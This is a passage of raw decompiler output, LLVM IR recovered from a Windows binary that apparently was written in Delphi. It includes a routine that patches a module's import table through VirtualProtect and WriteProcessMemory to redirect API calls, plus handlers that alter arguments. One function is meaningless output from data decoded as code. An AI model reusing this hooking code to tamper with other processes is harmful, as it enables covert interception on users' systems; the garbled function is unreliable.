  %31 = ptrtoint i32* %30 to i32, !insn.addr !1989
  %32 = add i32 %esp.0, -16, !insn.addr !1990
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1990
  store i32 %31, i32* %33, align 4, !insn.addr !1990
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1991
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !1991
  %36 = add i32 %eax.0.reload, 24, !insn.addr !1992
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1992
  store i32 %35, i32* %37, align 4, !insn.addr !1992
  %38 = icmp eq i32 ()* %34, null, !insn.addr !1993
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1994
  br i1 %38, label %dec_label_pc_4076cb, label %dec_label_pc_4076b7, !insn.addr !1994

dec_label_pc_4076b7:                              ; preds = %dec_label_pc_40768f
  %39 = load i32, i32* %24, align 4, !insn.addr !1995
  %40 = add i32 %esp.0, -20, !insn.addr !1996
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1996
  store i32 %39, i32* %41, align 4, !insn.addr !1996
  %42 = load i32, i32* %15, align 4, !insn.addr !1997
  %43 = add i32 %esp.0, -24, !insn.addr !1998
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1998
  store i32 %42, i32* %44, align 4, !insn.addr !1998
  %45 = call i32 @function_407734(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1999
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !1999
  br label %dec_label_pc_4076cb, !insn.addr !1999

dec_label_pc_4076cb:                              ; preds = %dec_label_pc_4076b7, %dec_label_pc_40768f, %dec_label_pc_407673
  br i1 %7, label %dec_label_pc_4076e2, label %dec_label_pc_4076d3, !insn.addr !2000

dec_label_pc_4076d3:                              ; preds = %dec_label_pc_4076cb
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !2001
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !2002
  %48 = load i32, i32* %47, align 4, !insn.addr !2002
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !2002
  br label %dec_label_pc_4076e2, !insn.addr !2003

dec_label_pc_4076e2:                              ; preds = %dec_label_pc_4076d3, %dec_label_pc_4076cb
  %49 = add i32 %eax.0.reload, 4, !insn.addr !2004
  %50 = inttoptr i32 %49 to i32*, !insn.addr !2004
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1976
  ret i32 %eax.0.reload, !insn.addr !2005
}

define i32 @function_4076ec() local_unnamed_addr {
dec_label_pc_4076ec:
  %eax.1.reg2mem = alloca i32, !insn.addr !2006
  %eax.0.reg2mem = alloca i32, !insn.addr !2006
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !2007
  %4 = add i32 %3, 8, !insn.addr !2008
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2008
  %6 = load i32, i32* %5, align 4, !insn.addr !2008
  %7 = icmp eq i32 %6, 0, !insn.addr !2008
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2009
  br i1 %7, label %dec_label_pc_407726, label %dec_label_pc_4076fd, !insn.addr !2009

dec_label_pc_4076fd:                              ; preds = %dec_label_pc_4076ec
  %8 = add i32 %3, 24, !insn.addr !2010
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2010
  %10 = load i32, i32* %9, align 4, !insn.addr !2010
  %11 = icmp eq i32 %10, 0, !insn.addr !2010
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2011
  br i1 %11, label %dec_label_pc_407726, label %dec_label_pc_407703, !insn.addr !2011

dec_label_pc_407703:                              ; preds = %dec_label_pc_4076fd
  %12 = add i32 %3, 4, !insn.addr !2012
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2012
  %14 = load i32, i32* %13, align 4, !insn.addr !2012
  %15 = inttoptr i32 %14 to i8*, !insn.addr !2013
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !2014
  %17 = ptrtoint i32* %16 to i32, !insn.addr !2014
  %18 = load i32, i32* %5, align 4, !insn.addr !2015
  %19 = icmp eq i32 %18, %17, !insn.addr !2015
  %20 = icmp eq i1 %19, false, !insn.addr !2016
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !2016
  br i1 %20, label %dec_label_pc_407726, label %dec_label_pc_407711, !insn.addr !2016

dec_label_pc_407711:                              ; preds = %dec_label_pc_407703
  %21 = load i32, i32* %9, align 4, !insn.addr !2017
  %22 = call i32 @function_407734(i32 %21), !insn.addr !2018
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !2018
  br label %dec_label_pc_407726, !insn.addr !2018

dec_label_pc_407726:                              ; preds = %dec_label_pc_407711, %dec_label_pc_407703, %dec_label_pc_4076fd, %dec_label_pc_4076ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !2019
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2020
  br i1 %24, label %dec_label_pc_407731, label %dec_label_pc_40772a, !insn.addr !2020

dec_label_pc_40772a:                              ; preds = %dec_label_pc_407726
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !2021
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !2021
  br label %dec_label_pc_407731, !insn.addr !2021

dec_label_pc_407731:                              ; preds = %dec_label_pc_40772a, %dec_label_pc_407726
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !2022
}

define i32 @function_407734(i32 %arg1) local_unnamed_addr {
dec_label_pc_407734:
  %eax.0.reg2mem = alloca i32, !insn.addr !2023
  %esp.0.reg2mem = alloca i32, !insn.addr !2023
  %storemerge6.reg2mem = alloca i32, !insn.addr !2023
  %.reg2mem14 = alloca i32, !insn.addr !2023
  %esp.17.reg2mem = alloca i32, !insn.addr !2023
  %esi.08.reg2mem = alloca i32, !insn.addr !2023
  %.reg2mem = alloca i32, !insn.addr !2023
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !2024
  %4 = icmp eq i1 %3, false, !insn.addr !2025
  %5 = icmp eq i32 %arg1, 0, !insn.addr !2026
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_4077e1, label %dec_label_pc_40775a, !insn.addr !2025

dec_label_pc_40775a:                              ; preds = %dec_label_pc_407734
  %6 = trunc i32 %2 to i16, !insn.addr !2027
  %7 = trunc i32 %1 to i8, !insn.addr !2028
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !2029
  %8 = inttoptr i32 %0 to i32*, !insn.addr !2030
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !2030
  %10 = ptrtoint i32* %9 to i32, !insn.addr !2030
  %11 = icmp eq i32* %9, null, !insn.addr !2031
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2032
  br i1 %11, label %dec_label_pc_4077e1, label %dec_label_pc_4077da.preheader, !insn.addr !2032

dec_label_pc_4077da.preheader:                    ; preds = %dec_label_pc_40775a
  %12 = add i32 %10, 12, !insn.addr !2033
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2033
  %14 = load i32, i32* %13, align 4, !insn.addr !2033
  %15 = icmp eq i32 %14, 0, !insn.addr !2034
  %16 = icmp eq i1 %15, false, !insn.addr !2035
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !2035
  br i1 %16, label %dec_label_pc_407773.lr.ph, label %dec_label_pc_4077e1, !insn.addr !2035

dec_label_pc_407773.lr.ph:                        ; preds = %dec_label_pc_4077da.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !2029
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !2036
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_407773

dec_label_pc_407773:                              ; preds = %dec_label_pc_407773.lr.ph, %dec_label_pc_4077d7
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !2037
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2038
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2038
  store i32 %18, i32* %25, align 4, !insn.addr !2038
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2039
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2039
  store i32 %23, i32* %27, align 4, !insn.addr !2039
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2040
  %29 = icmp eq i32 %28, 0, !insn.addr !2041
  %30 = icmp eq i1 %29, false, !insn.addr !2042
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2042
  br i1 %30, label %dec_label_pc_4077d7, label %dec_label_pc_407786, !insn.addr !2042

dec_label_pc_407786:                              ; preds = %dec_label_pc_407773
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2043
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2043
  %33 = load i32, i32* %32, align 4, !insn.addr !2043
  %34 = add i32 %33, %arg1, !insn.addr !2044
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2045
  %36 = load i32, i32* %35, align 4, !insn.addr !2045
  %37 = icmp eq i32 %36, 0, !insn.addr !2046
  %38 = icmp eq i1 %37, false, !insn.addr !2047
  store i32 %36, i32* %.reg2mem14, !insn.addr !2047
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2047
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2047
  br i1 %38, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2047

dec_label_pc_40778e:                              ; preds = %dec_label_pc_407786, %dec_label_pc_4077ce
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2048
  %40 = icmp eq i1 %39, false, !insn.addr !2049
  br i1 %40, label %dec_label_pc_4077ce, label %dec_label_pc_407793, !insn.addr !2049

dec_label_pc_407793:                              ; preds = %dec_label_pc_40778e
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2050
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2050
  store i32 %20, i32* %42, align 4, !insn.addr !2050
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2051
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2051
  store i32 128, i32* %44, align 4, !insn.addr !2051
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2052
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2052
  store i32 4, i32* %46, align 4, !insn.addr !2052
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2053
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2053
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2053
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2054
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2055
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2055
  store i32 %21, i32* %51, align 4, !insn.addr !2055
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2056
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2056
  store i32 4, i32* %53, align 4, !insn.addr !2056
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2057
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2057
  store i32 %22, i32* %55, align 4, !insn.addr !2057
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2058
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2058
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2058
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2059
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2059
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2060
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2060
  store i32 %59, i32* %61, align 4, !insn.addr !2060
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2061
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2062
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2062
  store i32 %21, i32* %64, align 4, !insn.addr !2062
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2063
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2064
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2064
  store i32 %65, i32* %67, align 4, !insn.addr !2064
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2065
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2065
  store i32 4, i32* %69, align 4, !insn.addr !2065
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2066
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2066
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2066
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2067
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2068
  br label %dec_label_pc_4077d7, !insn.addr !2068

dec_label_pc_4077ce:                              ; preds = %dec_label_pc_40778e
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2069
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2045
  %75 = load i32, i32* %74, align 4, !insn.addr !2045
  %76 = icmp eq i32 %75, 0, !insn.addr !2046
  %77 = icmp eq i1 %76, false, !insn.addr !2047
  store i32 %75, i32* %.reg2mem14, !insn.addr !2047
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2047
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2047
  br i1 %77, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2047

dec_label_pc_4077d7:                              ; preds = %dec_label_pc_4077ce, %dec_label_pc_407786, %dec_label_pc_407793, %dec_label_pc_407773
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2070
  %79 = add i32 %esi.08.reload, 32, !insn.addr !2033
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2033
  %81 = load i32, i32* %80, align 4, !insn.addr !2033
  %82 = icmp eq i32 %81, 0, !insn.addr !2034
  %83 = icmp eq i1 %82, false, !insn.addr !2035
  store i32 %81, i32* %.reg2mem, !insn.addr !2035
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !2035
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !2035
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !2035
  br i1 %83, label %dec_label_pc_407773, label %dec_label_pc_4077e1, !insn.addr !2035

dec_label_pc_4077e1:                              ; preds = %dec_label_pc_4077d7, %dec_label_pc_4077da.preheader, %dec_label_pc_40775a, %dec_label_pc_407734
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2071
}

define i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4077ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2072
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2072
  %3 = load i32, i32* %2, align 4, !insn.addr !2072
  ret i32 %3, !insn.addr !2073
}

define i32 @function_4077f0() local_unnamed_addr {
dec_label_pc_4077f0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2074
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2074
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2074
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2075
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2076
  %3 = add i32 %2, 1, !insn.addr !2076
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !2076
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2077
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2078
  ret i32 0, !insn.addr !2079
}

define i32 @function_407815() local_unnamed_addr {
dec_label_pc_407815:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2080
  ret i32 %0, !insn.addr !2080
}

define i32 @function_40781a() local_unnamed_addr {
dec_label_pc_40781a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2081
}

define i32 @function_40781c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40781c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2082
}

define i32 @function_407820() local_unnamed_addr {
dec_label_pc_407820:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2083
  %2 = add i32 %1, -1, !insn.addr !2083
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !2083
  ret i32 %0, !insn.addr !2084
}

define i32 @function_407828(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407828:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_4077ec(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2085
  ret i32 %3, !insn.addr !2086
}

define i32 @function_407874(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407874:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2087
  %2 = icmp eq i1 %1, false, !insn.addr !2088
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_4077ec(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2089
  ret i32 %3, !insn.addr !2090
}

define i32 @function_4078a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4078a4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2091
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2091
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2091
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2092
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2093
  %3 = call i32 @"@LStrPos"(), !insn.addr !2094
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2095
  %6 = call i32 @"@LStrPos"(), !insn.addr !2096
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %8 = call i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2097
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2098
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2099
  ret i32 %9, !insn.addr !2100
}

define i32 @function_40793c() local_unnamed_addr {
dec_label_pc_40793c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2101
  ret i32 %0, !insn.addr !2101
}

define i32 @function_407941() local_unnamed_addr {
dec_label_pc_407941:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2102
}

define i32 @function_407943(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407943:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2103
}

define i32 @function_407953() local_unnamed_addr {
dec_label_pc_407953:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2104
}

define i32 @function_4079a0() local_unnamed_addr {
dec_label_pc_4079a0:
  %0 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a1c, i32 0, i32 0), i32 4225064), !insn.addr !2105
  store i32 %0, i32* @global_var_40810c, align 4, !insn.addr !2106
  %1 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a38, i32 0, i32 0), i32 4225140), !insn.addr !2107
  store i32 %1, i32* @global_var_408110, align 4, !insn.addr !2108
  %2 = call i32 @function_407660(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a50, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_407a5c, i32 0, i32 0), i32 4225188), !insn.addr !2109
  store i32 %2, i32* @global_var_408114, align 4, !insn.addr !2110
  ret i32 %2, !insn.addr !2111
}

define i32 @function_407a10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_407a10:
  %merge.reg2mem = alloca i32, !insn.addr !2112
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2112
  br i1 %10, label %dec_label_pc_407a3f, label %dec_label_pc_407a12, !insn.addr !2112

dec_label_pc_407a12:                              ; preds = %dec_label_pc_407a10
  br i1 %8, label %dec_label_pc_407a48, label %dec_label_pc_407a15, !insn.addr !2113

dec_label_pc_407a15:                              ; preds = %dec_label_pc_407a12
  %11 = trunc i32 %4 to i16, !insn.addr !2114
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2114
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2114
  store i8 %12, i8* %13, align 1, !insn.addr !2114
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2115
  store i8 %14, i8* %13, align 1, !insn.addr !2115
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2116
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2116
  %19 = add i8 %16, %18, !insn.addr !2116
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2116
  store i8 %19, i8* %20, align 1, !insn.addr !2116
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2117
  %21 = trunc i32 %arg10 to i16, !insn.addr !2118
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2118
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2118
  store i32 %22, i32* %23, align 4, !insn.addr !2118
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2119
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2120
  %25 = load i8, i8* %24, align 1, !insn.addr !2120
  %26 = trunc i32 %arg1 to i8, !insn.addr !2120
  %27 = add i8 %25, %26, !insn.addr !2120
  store i8 %27, i8* %24, align 1, !insn.addr !2120
  %28 = trunc i32 %arg3 to i16, !insn.addr !2121
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2121
  %30 = load i32, i32* %29, align 4, !insn.addr !2121
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2121
  %31 = add i32 %arg5, 67, !insn.addr !2122
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2122
  %34 = load i32, i32* %33, align 4, !insn.addr !2122
  %35 = load i8, i8* %24, align 1, !insn.addr !2123
  %36 = add i8 %35, %26, !insn.addr !2123
  store i8 %36, i8* %24, align 1, !insn.addr !2123
  %37 = mul i32 %34, 1557718248, !insn.addr !2124
  %38 = add i32 %arg7, 97, !insn.addr !2124
  %39 = add i32 %38, %37, !insn.addr !2124
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2124
  %41 = load i8, i8* %40, align 1, !insn.addr !2124
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2124
  %44 = add i8 %43, %41, !insn.addr !2124
  %45 = icmp eq i8 %44, 0, !insn.addr !2124
  store i8 %44, i8* %40, align 1, !insn.addr !2124
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2125
  br i1 %45, label %dec_label_pc_407ab1, label %dec_label_pc_407a3f, !insn.addr !2125

dec_label_pc_407a3f:                              ; preds = %dec_label_pc_407a10, %dec_label_pc_407a15
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2126

dec_label_pc_407a48:                              ; preds = %dec_label_pc_407a12
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2127
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2127
  store i8 %48, i8* %49, align 1, !insn.addr !2127
  %50 = add i32 %3, 104, !insn.addr !2128
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2128
  %52 = load i8, i8* %51, align 1, !insn.addr !2128
  %53 = udiv i32 %4, 256, !insn.addr !2128
  %54 = trunc i32 %53 to i8, !insn.addr !2128
  %55 = add i8 %52, %54, !insn.addr !2128
  store i8 %55, i8* %51, align 1, !insn.addr !2128
  %56 = trunc i32 %4 to i16, !insn.addr !2129
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2129
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2129
  store i8 %57, i8* %58, align 1, !insn.addr !2129
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2130
  store i8 %59, i8* %58, align 1, !insn.addr !2130
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2131
  store i8 %60, i8* %58, align 1, !insn.addr !2131
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2132
  store i8 %61, i8* %58, align 1, !insn.addr !2132
  %62 = load i8, i8* %51, align 1, !insn.addr !2133
  %63 = trunc i32 %4 to i8, !insn.addr !2133
  %64 = add i8 %62, %63, !insn.addr !2133
  store i8 %64, i8* %51, align 1, !insn.addr !2133
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2134
  store i8 %65, i8* %58, align 1, !insn.addr !2134
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2135
  store i8 %66, i8* %58, align 1, !insn.addr !2135
  %67 = add i32 %2, 1, !insn.addr !2136
  %68 = icmp slt i32 %67, 0, !insn.addr !2136
  br i1 %68, label %dec_label_pc_407ac9, label %dec_label_pc_407a64, !insn.addr !2137

dec_label_pc_407a64:                              ; preds = %dec_label_pc_407a48
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2138
  %72 = xor i32 %4, %1, !insn.addr !2139
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2140
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2140
  %76 = load i16, i16* %75, align 2, !insn.addr !2140
  %77 = trunc i32 %72 to i16, !insn.addr !2140
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2140
  %78 = load i8, i8* %73, align 4, !insn.addr !2141
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2141
  %81 = add i8 %78, %80, !insn.addr !2141
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2141
  store i8 %81, i8* %82, align 1, !insn.addr !2141
  %83 = add i32 %71, 82, !insn.addr !2142
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2142
  %85 = load i8, i8* %84, align 1, !insn.addr !2142
  %86 = add i8 %85, %63, !insn.addr !2142
  store i8 %86, i8* %84, align 1, !insn.addr !2142
  %87 = load i32, i32* %eax, align 4, !insn.addr !2143
  %88 = add i32 %87, -1, !insn.addr !2143
  %89 = add i32 %71, 4227341, !insn.addr !2144
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2144
  %91 = load i8, i8* %90, align 1, !insn.addr !2144
  %92 = udiv i32 %88, 256, !insn.addr !2144
